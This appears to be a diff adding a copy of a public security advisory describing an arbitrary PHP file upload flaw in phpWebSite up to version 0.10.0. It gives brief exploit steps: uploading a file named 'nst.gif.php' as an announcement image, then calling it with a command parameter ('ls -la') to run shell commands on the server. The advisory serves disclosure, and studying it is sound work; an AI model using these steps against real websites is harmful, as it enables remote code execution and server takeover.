@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/12653/info
+
+phpWebSite is reported prone to a remote arbitrary PHP file upload vulnerability. The issue presents itself due to a lack of sanitization performed on image files that are uploaded when submitting an announcement.
+
+A remote attacker may exploit this condition to execute arbitrary PHP code in the context of the hosting web server process.
+
+This vulnerability is reported to affect phpWebSite versions up to an including version 0.10.0. 
+
+http://www.example.com/index.php?module=announce&ANN_user_op=submit_announcement&MMN_position=3:3
+
+1. Fill all inputs
+2. in Image: select nst.gif.php
+
+press Save.
+
+Go here http://www.example.com/images/announce/nst.gif.php?nst=ls -la 
